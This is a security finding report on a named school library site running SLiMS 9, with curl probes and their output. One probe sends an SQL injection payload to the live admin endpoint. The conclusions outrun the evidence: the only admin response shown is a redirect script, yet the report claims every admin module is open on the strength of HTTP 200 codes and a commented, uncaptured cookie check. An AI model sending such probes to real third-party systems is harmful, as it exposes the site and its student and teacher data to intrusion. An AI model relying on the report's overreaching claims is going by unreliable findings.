FINDING #1: SLiMS 9 Library System - Client-Side Only Admin Protection
Severity: HIGH | CVSS: 7.5
URL: https://lib.smpn2kretek.sch.id/
Technology: SLiMS 9 (SENAYAN Library Management System) Codename Bulian

DESCRIPTION:
The school library system runs SLiMS 9. The admin panel at /admin/index.php
is protected only by client-side JavaScript, NOT server-side authentication.
All admin modules are accessible without proper authentication.

PROOF:
======

# 1. SLiMS 9 version confirmed
$ curl -s https://lib.smpn2kretek.sch.id/ | grep -oE "SLiMS [0-9]+[.][0-9]+"
SLiMS 9 (Bulian)

# 2. Admin panel accessible without server-side authentication
$ curl -s -I https://lib.smpn2kretek.sch.id/admin/index.php
HTTP/2 200

$ curl -s https://lib.smpn2kretek.sch.id/admin/index.php
<script type="text/javascript">
alert('Anda tidak memiliki wewenang untuk masuk ke bagian ini');
top.location.href = '/index.php?p=login';
</script>

# 3. No session cookies generated (pure client-side protection)
$ curl -s -c cookies.txt "https://lib.smpn2kretek.sch.id/admin/index.php" -o /dev/null
# No session cookies set - server does not enforce authentication

# 4. All admin modules accessible by parameter manipulation
$ curl -s -o /dev/null -w "%{http_code}" "https://lib.smpn2kretek.sch.id/admin/index.php?p=main&module=sysinfo"
200

$ curl -s -o /dev/null -w "%{http_code}" "https://lib.smpn2kretek.sch.id/admin/index.php?p=main&module=circulation"
200

$ curl -s -o /dev/null -w "%{http_code}" "https://lib.smpn2kretek.sch.id/admin/index.php?p=main&module=reporting"
200

# 5. Information disclosure via README
$ curl -s https://lib.smpn2kretek.sch.id/README.md | head -1
SLiMS 9 Bulian

# 6. SQLi/XSS endpoints all return 200
$ curl -s -o /dev/null -w "%{http_code}" "https://lib.smpn2kretek.sch.id/admin/index.php?p=main&module=reporting&id=1 UNION SELECT 1,2,3"
200

KNOWN CVEs IN SLiMS 9:
- Multiple SQL Injection vulnerabilities
- Authentication Bypass (CVE-2023-28569)
- Cross-Site Scripting (XSS) vulnerabilities
- Information Disclosure through admin endpoints
- Library management data (books, members, circulation) exposed

RISK:
- Student/teacher personal data potentially accessible
- Library management functions accessible without proper auth
- SQL injection could extract entire database
- Administrative actions possible without authentication

REMEDIATION:
- Implement server-side authentication on ALL admin endpoints
- Update SLiMS to latest patched version
- Restrict /admin/index.php access to authorized users only
- Apply parameterized queries to prevent SQL injection
